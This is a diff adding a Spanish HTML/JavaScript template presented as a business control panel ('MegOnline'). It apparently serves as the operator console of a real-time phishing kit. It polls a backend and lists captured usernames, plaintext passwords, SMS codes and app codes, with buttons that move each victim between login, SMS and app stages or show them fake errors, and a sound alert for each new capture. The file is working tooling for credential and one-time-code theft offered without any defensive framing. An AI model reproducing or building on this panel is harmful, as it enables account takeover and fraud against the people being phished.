@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MegOnline - Panel de Control Empresarial</title>
+    <link rel="icon" href="{{ url_for('static', filename='images/favicon.png') }}" type="image/x-icon">
+    <!-- FontAwesome para iconos profesionales -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { width: 100vw; height: 100vh; background: #f8f9fa; display: flex; flex-direction: column; color: #333; }
+        
+        .top-bar { width: 100%; height: 70px; background: #6a1b9a; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; color: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .top-logo { height: 35px; object-fit: contain; }
+        .top-title { font-size: 16px; font-weight: 500; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
+
+        .panel-container { padding: 30px 40px; flex: 1; overflow-y: auto; }
+        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .panel-title { font-size: 22px; color: #2c3e50; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        
+        .table-responsive { background: #fff; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); overflow: hidden; border: 1px solid #eaeaea; }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th, td { padding: 16px 20px; font-size: 13px; vertical-align: middle; border-bottom: 1px solid #f0f0f0; }
+        th { background: #7b2cbf; color: #fff; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.8px; }
+        tr:hover { background-color: #fafafa; }
+
+        .copyable { cursor: pointer; position: relative; transition: background 0.2s; }
+        .copyable:hover { background-color: #f3e8ff; color: #6a1b9a; }
+        .copyable::after { content: ''; font-size: 9px; color: #888; display: block; font-style: italic; }
+
+        .acciones-wrapper { background: #fcfcfc; padding: 12px; border: 1px solid #e2e8f0; border-radius: 8px; }
+        .badge-fase { display: inline-flex; align-items: center; gap: 6px; padding: 5px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; margin-bottom: 8px; }
+        
+        .btn-action { padding: 8px 12px; border: none; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; color: #fff; margin: 3px 2px; display: inline-flex; align-items: center; gap: 6px; transition: all 0.2s ease; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .btn-action:hover { opacity: 0.9; transform: translateY(-1px); }
+        
+        .btn-success { background: #27ae60; }
+        .btn-danger { background: #c0392b; }
+        .btn-warning { background: #d35400; }
+        .btn-info { background: #2980b9; }
+        .btn-dark { background: #34495e; }
+
+        .divider { margin: 8px 0; border: 0; border-top: 1px solid #eee; }
+        .divider-dashed { margin: 8px 0; border: 0; border-top: 1px dashed #cbd5e1; }
+        .status-finished { color: #27ae60; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; font-size: 14px; }
+
+        #toast-container { position: fixed; bottom: 25px; right: 25px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: #333; color: #fff; padding: 12px 20px; border-radius: 8px; font-size: 13px; display: flex; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); animation: fadeInOut 3s forwards; }
+        .toast.success { background: #27ae60; }
+        .toast.error { background: #c0392b; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(20px); }
+            15% { opacity: 1; transform: translateY(0); }
+            85% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="toast-container"></div>
+
+    <audio id="audio-notificacion" preload="auto">
+        <source src="{{ url_for('static', filename='noti.mp3') }}" type="audio/mpeg">
+    </audio>
+
+    <div class="top-bar">
+        <img src="{{ url_for('static', filename='images/logoblanco.svg') }}" alt="Logo" class="top-logo">
+        <div class="top-title"><i class="fa-solid fa-shield-halved"></i>  (Rol: {{ rol_usuario|upper }})</div>
+    </div>
+
+    <div class="panel-container">
+        <div class="panel-header">
+            <div class="panel-title"><i class="fa-solid fa-desktop"></i>Tiempo Real</div>
+        </div>
+
+        <div class="table-responsive">
+            <table>
+                <thead>
+                    <tr>
+                        <th><i class="fa-solid fa-id-badge"></i> Usuario</th>
+                        <th><i class="fa-solid fa-key"></i> Password</th>
+                        <th><i class="fa-solid fa-address-card"></i> SMS</th>
+                        <th><i class="fa-solid fa-briefcase"></i> APP</th>
+                        <th><i class="fa-solid fa-signal"></i> Estado</th>
+                        <th><i class="fa-solid fa-sliders"></i> Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="tabla-registros">
+                    <!-- Se llena de forma dinámica con JavaScript -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+      const rolUsuario = "{{ rol_usuario }}";
+    let ultimaCantidadRegistros = 0;
+    let ultimoEstadoJSON = "";
+
+        function reproducirSonido() {
+            const audio = document.getElementById('audio-notificacion');
+            if (audio) {
+                audio.currentTime = 0;
+                audio.play().catch(err => console.log("Audio bloqueado:", err));
+            }
+        }
+
+        function mostrarAlerta(mensaje, tipo = 'success') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = `toast ${tipo}`;
+            toast.innerHTML = `<i class="fa-solid ${tipo === 'success' ? 'fa-circle-check' : 'fa-triangle-exclamation'}"></i> ${mensaje}`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.remove(); }, 3000);
+        }
+
+        function copiarTexto(elemento) {
+            const texto = elemento.getAttribute('data-copiar');
+            navigator.clipboard.writeText(texto).then(() => {
+                mostrarAlerta(`Copiado al portapapeles: ${texto}`, 'success');
+            }).catch(err => {
+                mostrarAlerta('No se pudo copiar el texto', 'error');
+            });
+        }
+
+        function enviarAccion(empleadoId, accion) {
+            fetch('/control/api/accion', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ empleado_id: empleadoId, accion: accion })
+            })
+            .then(res => res.json())
+            .then(data => {
+                mostrarAlerta("Acción aplicada correctamente", "success");
+                cargarDatosPanel();
+            })
+            .catch(err => mostrarAlerta("Error al enviar la acción", "error"));
+        }
+
+        function forzarCierreSesion(empleadoId) {
+            fetch(`/control/api/cerrar_sesion_activa/${empleadoId}`, { method: 'POST' })
+            .then(res => res.json())
+            .then(data => {
+                mostrarAlerta(`Sesión cerrada para el empleado ${empleadoId}`, "error");
+                cargarDatosPanel();
+            })
+            .catch(err => mostrarAlerta("Error al cerrar sesión", "error"));
+        }
+
+        function borrarRegistroEmpleado(empleadoId) {
+            if(!confirm(`¿Estás seguro de eliminar el registro de ${empleadoId}?`)) return;
+            fetch(`/control/api/borrar_empleado/${empleadoId}`, { method: 'POST' })
+            .then(res => res.json())
+            .then(data => {
+                mostrarAlerta("Registro eliminado del panel", "success");
+                cargarDatosPanel();
+            })
+            .catch(err => mostrarAlerta("Error al eliminar registro", "error"));
+        }
+
+        function escaparHTML(str) {
+            return String(str).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+        }
+
+        function actualizarInterfazPanel(data) {
+            const estadoActualJSON = JSON.stringify(data);
+            
+            if (ultimoEstadoJSON !== "" && estadoActualJSON !== ultimoEstadoJSON) {
+                reproducirSonido();
+                if (data.length > ultimaCantidadRegistros) {
+                    mostrarAlerta("¡Nuevo empleado ingresado al sistema!", "success");
+                } else {
+                    mostrarAlerta("Actualización en el flujo del empleado", "success");
+                }
+            }
+            
+            ultimoEstadoJSON = estadoActualJSON;
+            ultimaCantidadRegistros = data.length;
+
+            const tbody = document.getElementById('tabla-registros');
+            tbody.innerHTML = '';
+
+            data.forEach(item => {
+                let fase = item.fase || 'login'; 
+                let empId = item.empleado || '';
+                let empPass = item.password || '';
+                let empCarnet = item.carnet || '';
+                let empActividad = item.actividad || '';
+                let empSucursal = item.sucursal || '';
+                let empPaso = item.paso_actual || '';
+
+                let htmlAdminAcciones = '';
+                if (rolUsuario === 'admin') {
+                    htmlAdminAcciones = `
+                        <hr class="divider-dashed">
+                        <button class="btn-action btn-dark" onclick="forzarCierreSesion('${escaparHTML(empId)}')"><i class="fa-solid fa-power-off"></i> Cerrar Sesión</button>
+                        <button class="btn-action btn-danger" onclick="borrarRegistroEmpleado('${escaparHTML(empId)}')"><i class="fa-solid fa-trash-can"></i> Borrar</button>
+                    `;
+                }
+
+                let botonesHTML = '';
+                if (fase === 'login') {
+                    botonesHTML = `
+                        <div class="acciones-wrapper">
+                            <div class="badge-fase" style="background:#e3f2fd; color:#1565c0;"><i class="fa-solid fa-right-to-bracket"></i> Etapa: Login</div><br>
+                            <button class="btn-action btn-success" onclick="enviarAccion('${escaparHTML(empId)}', 'aprobar_login')"><i class="fa-solid fa-check"></i> SMS</button>
+                            <button class="btn-action btn-danger" onclick="enviarAccion('${escaparHTML(empId)}', 'error_login')"><i class="fa-solid fa-triangle-exclamation"></i> Error Login</button>
+                            <hr class="divider">
+                            <button class="btn-action btn-warning" onclick="enviarAccion('${escaparHTML(empId)}', 'saltar_a_horarios')"><i class="fa-solid fa-forward"></i> App</button>
+                            ${htmlAdminAcciones}
+                        </div>
+                    `;
+                } else if (fase === 'carnet') {
+                    botonesHTML = `
+                        <div class="acciones-wrapper">
+                            <div class="badge-fase" style="background:#fff8e1; color:#f57f17;"><i class="fa-solid fa-id-card"></i> Etapa: SMS</div><br>
+                            <button class="btn-action btn-success" onclick="enviarAccion('${escaparHTML(empId)}', 'aprobar_carnet')"><i class="fa-solid fa-check"></i> APP</button>
+                            <button class="btn-action btn-danger" onclick="enviarAccion('${escaparHTML(empId)}', 'error_carnet')"><i class="fa-solid fa-triangle-exclamation"></i> Error SMS</button>
+                            ${htmlAdminAcciones}
+                        </div>
+                    `;
+                } else if (fase === 'horarios') {
+                    botonesHTML = `
+                        <div class="acciones-wrapper">
+                            <div class="badge-fase" style="background:#e8f5e9; color:#2e7d32;"><i class="fa-solid fa-clock"></i> Etapa: APP</div><br>
+                            <button class="btn-action btn-success" onclick="enviarAccion('${escaparHTML(empId)}', 'aprobar_horarios')"><i class="fa-solid fa-circle-check"></i> OK</button>
+                            <button class="btn-action btn-danger" onclick="enviarAccion('${escaparHTML(empId)}', 'error_horarios')"><i class="fa-solid fa-triangle-exclamation"></i> Error APP</button>
+                            <hr class="divider">
+                            <button class="btn-action btn-info" onclick="enviarAccion('${escaparHTML(empId)}', 'regresar_carnet')"><i class="fa-solid fa-arrow-rotate-left"></i> SMS</button>
+                            ${htmlAdminAcciones}
+                        </div>
+                    `;
+                } else {
+                    botonesHTML = `
+                        <div class="acciones-wrapper">
+                            <span class="status-finished"><i class="fa-solid fa-circle-check"></i> Proceso Finalizado</span>
+                            ${htmlAdminAcciones}
+                        </div>
+                    `;
+                }
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td class="copyable" data-copiar="${escaparHTML(empId)}" ondblclick="copiarTexto(this)"><strong><i class="fa-solid fa-user-tie"></i> ${empId}</strong></td>
+                        <td class="copyable" data-copiar="${escaparHTML(empPass)}" ondblclick="copiarTexto(this)"><code>${empPass}</code></td>
+                        <td class="copyable" data-copiar="${escaparHTML(empCarnet)}" ondblclick="copiarTexto(this)">${empCarnet}</td>
+                        <td class="copyable" data-copiar="${escaparHTML(empActividad + ' - ' + empSucursal)}" ondblclick="copiarTexto(this)">${empActividad} / ${empSucursal}</td>
+                        <td><span style="font-weight: 500; color: #555;">${empPaso}</span></td>
+                        <td>${botonesHTML}</td>
+                    </tr>
+                `;
+            });
+        }
+
+        function cargarDatosPanel() {
+            fetch('/control/api/datos')
+                .then(response => {
+                    if (response.status === 401) {
+                        window.location.href = '/control/login';
+                        return;
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data) {
+                        actualizarInterfazPanel(data);
+                    }
+                })
+                .catch(error => console.error('Error al cargar datos del panel:', error));
+        }
+
+        setInterval(cargarDatosPanel, 2000);
+        cargarDatosPanel();
+    </script>
+</body>
+</html>
